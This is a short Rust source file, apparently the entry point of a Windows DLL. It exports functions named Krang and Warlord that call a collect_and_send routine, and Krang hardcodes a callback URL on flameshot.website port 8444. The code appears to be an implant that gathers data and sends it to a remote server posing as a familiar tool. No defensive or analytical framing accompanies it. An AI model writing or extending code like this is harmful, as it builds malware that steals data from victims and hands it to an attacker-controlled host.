pub mod collect;
pub mod link_util;
//pub mod utils;

use crate::collect::collect_and_send;

#[unsafe(no_mangle)]
pub extern "system" fn Krang() {
    let sleep_time = 1;
    let session_id = "yolo".to_string();
    let url = "http://flameshot.website:8444/login.php".to_string();
    collect_and_send(sleep_time, session_id, url)
}

use std::ffi::{c_char, CStr};
#[unsafe(no_mangle)]
pub extern "system" fn Warlord(sleep_time: u64, session_id: *const c_char, url: *const c_char) {
    let session_id = unsafe { CStr::from_ptr(session_id) }
        .to_string_lossy()
        .to_string();
    let url = unsafe { CStr::from_ptr(url) }.to_string_lossy().to_string();

    collect_and_send(sleep_time, session_id, url)
}
